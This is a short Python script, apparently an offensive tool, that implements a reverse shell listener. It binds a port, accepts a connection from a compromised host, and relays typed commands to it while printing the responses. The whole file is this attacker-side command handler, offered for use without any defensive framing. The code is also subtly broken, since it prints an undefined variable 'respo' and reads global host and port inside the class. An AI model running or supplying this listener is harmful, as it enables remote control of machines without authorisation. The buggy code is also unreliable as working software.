#!/usr/bin/env python3
import sys
import socket
from argparse import ArgumentParser


def parse_args():
    parser = ArgumentParser(description="A simple Python3 Reverse Shell Listener.")
    parser.add_argument('host', type=str, help='Set host for Socket to listen on')
    parser.add_argument('port', type=int, help='Set port for socket to listen on')
    args = parser.parse_args()
    return args.host, args.port

class Listener():
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__conn, self.__addr = self.create_socket()
        self.start_shell()

    def create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.__host, self.__port))
        s.listen(1)
        print('Listening for connection on {}:{}'.format(host, port))
        return s.accept()

    def start_shell(self):
        while True:
            try:
                cmd = input('{}:{} > '.format(self.__addr[0], self.__addr[1]))
                cmd = cmd + '\x00'
                self.__conn.send(cmd.encode('utf-8'))
                resp = self.__conn.recv(2048).decode('utf-8')
                print(respo)
            except KeyboardInterrupt:
                print()
                self.__conn.close()
                sys.exit(1)


if __name__ == '__main__':
    host, port = parse_args()
    Listener(host, port)
